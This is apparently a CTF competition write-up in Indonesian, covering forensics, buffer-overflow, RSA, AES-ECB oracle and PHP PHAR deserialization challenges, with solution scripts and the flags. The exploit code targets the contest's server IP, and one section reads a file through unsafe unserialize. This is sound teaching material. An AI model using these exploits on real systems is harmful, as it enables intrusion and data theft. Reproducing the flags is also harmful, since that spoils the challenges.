![image](https://github.com/user-attachments/assets/d38e818a-1009-41d0-aece-d38a2aab73da)# Penyishan-Adikara-2024-Write-Up
# Misc
## Sanity Check
### Description
![image](https://github.com/user-attachments/assets/03b7c3b7-dd89-4b7b-97c4-592232e7e2ad)

### Solve
Flagnya dicantumin di deskripsi
```text
ADIKARACTF{>_<_good_luck_and_have_fun_>_<}
```

### Flag
```text
ADIKARACTF{>_<_good_luck_and_have_fun_>_<}
```

# Forensic
## Forensweet
### Description
![image](https://github.com/user-attachments/assets/5c60abc4-a57d-4eb4-ac08-009e944dbaca)

### Solve
Diberikan sebuah file wav audio (`audio.wav`) yang berisi morse code, kita bisa melakukan decoding morse code tersebut menggunakan online tools seperti https://morsefm.com/
![image](https://github.com/user-attachments/assets/40554713-d347-48de-852b-d982e461af7a)

Dan akan didapatkan sebuah teks `INFODISKONAKHIRTAHUN` dan ketika digabungkan dengan format flag yang diberikan akan didapatkan flag yang diminta

### Flag
```text
ADIKARACTF{INFODISKONAKHIRTAHUN}
```

## Forensheesh
### Description
![image](https://github.com/user-attachments/assets/712bf924-b54e-4369-80f1-f8d532cadbce)

### Solve
Diberikan sebuah har (`evidence.har`). Har file biasanya mencatat informasi interaksi web browser dengan website. 

Setelah dianalisis ada 1 link yang mengarah ke link commit di github https://github.com/W-zrd/Evil-Cropper/commit/96bc5c28cf273382e3332deb9a775fd23765a82d

Commit tersebut berisi 3 file yang memiliki pesan rahasia.
- File pertama yaitu file txt biasa (`flag.txt`) yang berisi
  - ![image](https://github.com/user-attachments/assets/02c77dee-d2a1-468e-bae6-b5033165291a)
- File kedua adalah file jpeg dan bin file (`cropped.jpg` dan `encrypted_half.bin`). Kita bisa mengembalikan gambar ke uncropped menggunakan tools yang disediakan pada github https://github.com/W-zrd/Evil-Cropper/. Tools tersebut akan membaca dua file `cropped.jpg` dan `encrypted_half.bin` lalu akan digabungkan.
    - Gunakan perintah berikut untuk menggabungkannya
    - ![image](https://github.com/user-attachments/assets/eb2407a5-2f1c-48af-9884-8f9ebff314e4)
    - Setelah digabungkan akan menghasilkan gambar berikut:
    - ![image](https://github.com/user-attachments/assets/a990e004-7198-435a-90c0-32fd27172643)

Gabungkan kedua flag akan menghasilkan `ADIKARACTF{so_u_are_familiar_with_har_and_python_huh_GGWP_by_Wzrd}`

### Flag
```text
ADIKARACTF{so_u_are_familiar_with_har_and_python_huh_GGWP_by_Wzrd}
```````

## Polygrot
### Description
![image](https://github.com/user-attachments/assets/32363692-d6ce-4260-8b1e-0a74e1f950a8)

### Solve
Diberikan sebuah file pdf (`flag.pdf`). Ketika dilakukan pengecekan file menggunakan **binwalk** kita dapat menemukan file zip lainnya di dalam file `flag.pdf`
![image](https://github.com/user-attachments/assets/6b0adc43-6d77-45ab-a9b8-83493421c07c)

Kita bisa mengekstrak file tersebut menggunakan tools **foremost** 
![image](https://github.com/user-attachments/assets/ed2f94b8-8753-4200-a221-cb8796b4a0d8)

Setelah diekstrak ada sebuah file zip `00000000.zip` dan setelah diekstrak akan mendapatkan file berikut
![image](https://github.com/user-attachments/assets/6e6f0fb8-12bb-4556-b923-6263418e210d)

Ketika file `flag.zip` akan diekstrak ternyata file zip tersebut memiliki password. Passwordnya bisa ditemukan pada judul soal yaitu **Polygrot**. Setelah diekstrak akan didapatkan sebuah gambar yang berisi qrcode. Lalu ketika qrcode tersebut discan akan memberikan bagian pertama flagnya.
![image](https://github.com/user-attachments/assets/0fcf1000-597a-4bad-9b02-5cd153affa94)

```
ADIKARACTF{noM_y0u_kn0w_what_is_}
```

Untuk bagian flag kedua ada di dalam file `flag.pdf`
![image](https://github.com/user-attachments/assets/b020da46-a3ea-42f2-aaad-f5737bdb42d6)


### Flag
```text
ADIKARACTF{noM_y0u_kn0w_what_is_polygots?_19adf}
```

# Binary Exploitation
## Binary Exploitation#1
### Description
![image](https://github.com/user-attachments/assets/bc11982e-3901-4aa8-b41d-12405c02bb42)

### Solve
Diberikan 2 file, yang pertama file binary `vuln` dan yang kedua file `vuln.c`. Dichallenge ini kita harus mengirimkan data yang cukup besar untuk memicu buffer overflow. dan juga overwrite nilai variabel `overflow_me` untuk memecahkan tantangan. Kita bisa menyelesaikan challenge ini menggunakan script python berikut (dan juga penjelasannya)
```python
from pwn import *

# Hubungkan ke server target menggunakan fungsi remote()
conn = remote('117.53.47.247', 50010)

# Buat pola cyclic untuk menemukan offset
pattern = cyclic(100)  # Pola 100 byte untuk memicu buffer overflow

# Kirimkan pola cyclic ke server
conn.sendline(pattern)

# Menerima dan print respon dari server
print(conn.recvall().decode())
```

Ketika dijalankan kita akan mendapatkan output berikut
![image](https://github.com/user-attachments/assets/7ec8cd1d-5604-4143-be76-8f7d4864595f)


### Flag
```text
ADIKARACTF{OoO_ez_overflow_part_1_1fa032}
```

## Binary Exploitation#2
### Description
![image](https://github.com/user-attachments/assets/98938f1d-be54-4a83-965f-de1dab561a68)

### Solve
File pada challenge ini sama dengan file sebelumnya cuman bedanya kita mengirim payload yang mengubah nilai overflow_me menjadi `0xdeadbeef`, sehingga server akan memberikan flag. Berikut 
```
from pwn import *

# Hubungkan ke server target menggunakan fungsi remote()
conn = remote('117.53.47.247', 50010)

# Buat payload: 72 byte buffer + 0xdeadbeef (little-endian)
payload = b'A'*72 + p64(0xdeadbeef)

# Kirimkan payload ke server
conn.sendline(payload)

# Menerima dan print respon dari server
response = conn.recvall()
print(response)  # This will print raw bytes
```

Ketika dijalankan akan mendapatkan output berikut
![image](https://github.com/user-attachments/assets/4de8808a-da2c-4a52-b412-39c6df366c70)


### Flag
```text
ADIKARACTF{now_u_know_endianess_right?_94fc1a}
```

# Cryptography
## Safe RSA
### Description
![image](https://github.com/user-attachments/assets/e2095796-6969-4c73-af01-7dd710cb52e6)


### Solve
Diberikan 2 file, yang pertama file python `gen.py` dan yang kedua file txt `output.txt`. File gen.py berisi proses pembuatan key. Untuk menyelesaikan challenge ini kita bisa menganalisis file `gen.py` dan `output.txt`. Dari `gen.py`, diketahui $q = 2p + 1$, sehingga $n$ memenuhi persamaan kuadrat $2p^2 + p - n = 0$. Dengan $n$ yang diberikan, kita memecahkan persamaan untuk mendapatkan $p$, lalu menghitung $q$ sebagai $2p + 1$. Selanjutnya, hitung $\phi (n) = (p − 1)(q − 1)$ dan gunakan $d = e^{-1}$ mod $\phi (n)$ untuk mendapatkan kunci privat. Terakhir, dekripsi ciphertext $c$ menggunakan $m = c^d$ mod $n$ dan konversikan hasilnya ke teks untuk mendapatkan flag. Berikut adalah program python untuk menyelesaikan challenge ini

```python
from Crypto.Util.number import long_to_bytes
from math import isqrt

def solve_quadratic(a, b, c):
    # Memecahkan persamaan kuadrat
    discriminant = b * b - 4 * a * c
    return (-b + isqrt(discriminant)) // (2 * a)

# Diberikan dari output.txt
n = 141462798088722051318799729490921841045684289129519401507458481551818501345780972050140869439773419571781243083655675803580035825559100776989995997460352754682544784811123149386346851850688727377614402261954229978269219754312075185083872573296071312565168967164450658906124427063020647048739457948457283284791
e = 65537
c = 95810701202087853841743731093149430655593147683421871799265784567546744027028327006037927756808923742806457516687369724053659801409665809484333704658005178575699287145132631020220338745054190238905155637221474537758319000878100880684173099253778386118547321637286540549815419269314760633502070855820951147798

# Langkah 1: Pecahkan persamaan kuadrat
p = solve_quadratic(2, 1, -n)

# Langkah 2: Hitung q
q = 2 * p + 1

# Langkah 3: Hitung phi(n)
phi = (p - 1) * (q - 1)

# Langkah 4: Hitung kunci privat d
d = pow(e, -1, phi)

# Langkah 5: Dekripsi ciphertext
m = pow(c, d, n)
flag = long_to_bytes(m)
print(f"Flag: {flag.decode()}")
```

Ketika dijalankan program akan memberikan output berikut
![image](https://github.com/user-attachments/assets/73fc33aa-721d-41bd-aaeb-b519f92f28ac)

### Flag
```text
ADIKARACTF{info_nilai_kalkulus_brp_bang_90afc2}
```

## EaaS
### Description
![image](https://github.com/user-attachments/assets/d057a5d2-6564-40cd-b7e1-d2488d753daa)

### Solve
Diberikan file server.py untuk melakukan analisis. Challenge ini memberikan layanan enkripsi dimana:
- Server menggunakan AES dalam mode ECB (Electronic Code Book)
- Data yang dienkripsi adalah gabungan dari user input + flag
- Data di-padding agar sesuai dengan block size (16 bytes)
- Secret key di-generate secara random

Kelemahan utama disini adalah penggunaan ECB yang memiliki karakteristik:
- Block yang sama akan menghasilkan ciphertext yang sama
- Setiap block dienkripsi secara independen

Berikut adalah kode exploit yang bisa digunakan
```python
from pwn import *
import string

# Fungsi untuk connect ke server
def connect():
    return remote('117.53.47.247', 60010)

# Fungsi untuk melakukan enkripsi dengan mengirimkan pesan ke server
def encrypt(r, message):
    r.sendlineafter(b"Enter your choice: ", b"1") # Pilih opsi enkkripsi
    r.sendlineafter(b"Enter your message: ", message) # Kirim pesan yang akan dienkripsi
    response = r.recvline().decode().strip() # Terima respon dari server
    return bytes.fromhex(response.split("Encrypted: ")[1]) # Convert hex ke bytes

# Fungsi untuk nyari ukuran block dengan menambah input hingga panjang outputnya berubah
def find_block_size():
    r = connect()
    base_length = len(encrypt(r, b"")) # Dapatkan panjang output awal
    i = 1
    while True:
        length = len(encrypt(r, b"A" * i)) # Coba dengan input yang lebih panjang
        if length > base_length: # Ngecek jika panjang berubah
            r.close()
            return length - base_length # Kembalikan selisih sebagai block size
        i += 1

# Fungsi untuk mendapatkan flag
def leak_flag():
    r = connect()
    block_size = 16  # Block size AES adalah 16 bytes
    known_flag = b""
    
    # Hitung panjang padding yang diperlukan agar byte flag yang dicari berada di akhir block
    while True:
        pad_length = (block_size - (len(known_flag) % block_size) - 1)
        padding = b"A" * pad_length
        
        # Dapatkan block target yang berisi padding + 1 byte flag yang tidak diketahui
        target = encrypt(r, padding)
        target_block_index = (len(padding) + len(known_flag)) // block_size
        target_block = target[target_block_index * block_size:(target_block_index + 1) * block_size]
        
        found = False
        # Coba semua kemungkinan byte yang printable
        for c in string.printable.encode():
            test_input = padding + known_flag + bytes([c]) # Gabungkan padding + flag yang diketahui + byte yang dicoba
            result = encrypt(r, test_input)
            test_block = result[target_block_index * block_size:(target_block_index + 1) * block_size]
            
            # Jika block sama dengan target, berarti byte ditemukan
            if test_block == target_block:
                known_flag += bytes([c])
                print(f"Found byte: {bytes([c])} | Current flag: {known_flag}")
                found = True
                break
        
        # Jika tidak ada byte yang cocok, berarti flag sudah lengkap
        if not found:
            break
    
    r.close()
    return known_flag

if __name__ == "__main__":
    print("Starting exploit...")
    flag = leak_flag()
    print(f"\nFinal flag: {flag}")
```

Ketika program dijalankan akan menghasilkan output berikut
![image](https://github.com/user-attachments/assets/205424e3-9cc0-46ab-b160-0276f4832543)


### Flag
```text
ADIKARACTF{ecb_doang_ez_lah_ya_8af92a}
```

# Web Exploitation
## Blaze
### Description
![image](https://github.com/user-attachments/assets/08bbc5a7-1cc5-4f2b-aa84-8164310998c5)


### Solve
Untuk challenge ini kita diberikan source code file dari website challenge itu sendiri. Di sini untuk menemukan flag yang tersembunyi kita harus mengetahui username dan password untuk login terlebih dahulu. Kita bisa menggunakan tools **Jetbrains dotPeek** untuk mengakses file `BlazeBleed.dll`.

Ketika menjalankan aplikasi **dotPeek** kita bisa melakukan import file `BlazeBleed.dll`, setelah itu cari ke `Metadata > Param > username`. Lalu anda akan menemukan kredensial login yaitu **admin** dan password login yaitu **isitjustmyimagination?**
![image](https://github.com/user-attachments/assets/fe3d9e7a-7838-4da3-9566-2f26718d7794)

Lalu akses web challenge-nya pada url http://117.53.47.247:40010/. Lakukan login menggunakan kredensial yang kita temukan sebelumnya
![image](https://github.com/user-attachments/assets/824d3b4f-24f8-4537-bad1-b96bfafe93be)

Setelah login kita akan menemukan flag yang kita cari
![image](https://github.com/user-attachments/assets/5bf83783-b492-499b-82d1-31ba0b76e9cf)

### Flag
```text
ADIKARACTF{blaze?_i_think_i_misspelled_blazor_bzbz_5b2055}
```

## Lambo Sandbox
### Description
![image](https://github.com/user-attachments/assets/cdd97825-6fb4-4877-97dd-702277c23d83)

### Solve
Pada challenge ini diberikan 2 file yaitu `lambo-sandbox-src.zip` dan `index_revised.php`. Challenge ini adalah aplikasi web PHP yang memungkinkan kita untuk mengupload PHAR (PHP Archive). Setelah dianalisis, ditemukan celah keamanan pada proses deserialisasi object PHP.

Vulnerability utamanya ada pada kode berikut:
```php
$data = file_get_contents($dataPath);
$unserializedData = unserialize($data);

if ($unserializedData instanceof Helper) {
    $unserializedData->process();
}
```

Di sini, aplikasi akan membaca file dari PHAR yang kita upload, melakukan deserialisasi, dan jika hasilnya adalah object dari class Helper, maka method `process()` akan dijalankan.

Class Helper sendiri memiliki kode seperti ini:
```php
class Helper {
    public string $file = '/tmp/sandbox';
    
    public function process(): void {
        echo file_get_contents($this->file);
    }
}
```

Kita bisa memanfaatkan ini untuk membaca file `/flag` dengan cara memodifikasi property `$file`.

Berikut adalah file php untuk membuat exploit PHAR
```php
<?php
class Helper {
    public string $file = '/flag';
}

// Buat folder untuk file Phar yang kita buat
$phar_dir = '.';
if (!file_exists($phar_dir)) {
    mkdir($phar_dir);
}

// Serialisasikan objek Helper yang telah dimodifikasi
$serialized_helper = serialize(new Helper());

// Buat magic file
file_put_contents($phar_dir . '/magic_happens_here', $serialized_helper);

// Buat file Phar
$phar_file = $phar_dir . '/exploit.phar';
$phar = new Phar($phar_file);
$phar->startBuffering();
$phar->addFromString('magic_happens_here', $serialized_helper);
$phar->setStub('<?php __HALT_COMPILER(); ?>');
$phar->stopBuffering();

echo "Exploit PHAR created at: $phar_file\n";
?>
```

Jalankan php create_exploit.php
![image](https://github.com/user-attachments/assets/c9bb75da-5b3e-4f86-af43-28c3acd015b0)

Lalu ketika kita melakukan upload `exploit.phar` pada web challenge ini yaitu http://117.53.47.247:40011/ maka akan mendapatkan flag yang kita cari
![image](https://github.com/user-attachments/assets/03ffcfb4-b611-4e52-9129-df9b3e5986d2)

### Flag
```text
ADIKARACTF{this_challenge_was_made_one_hour_ago_be2e51}
```



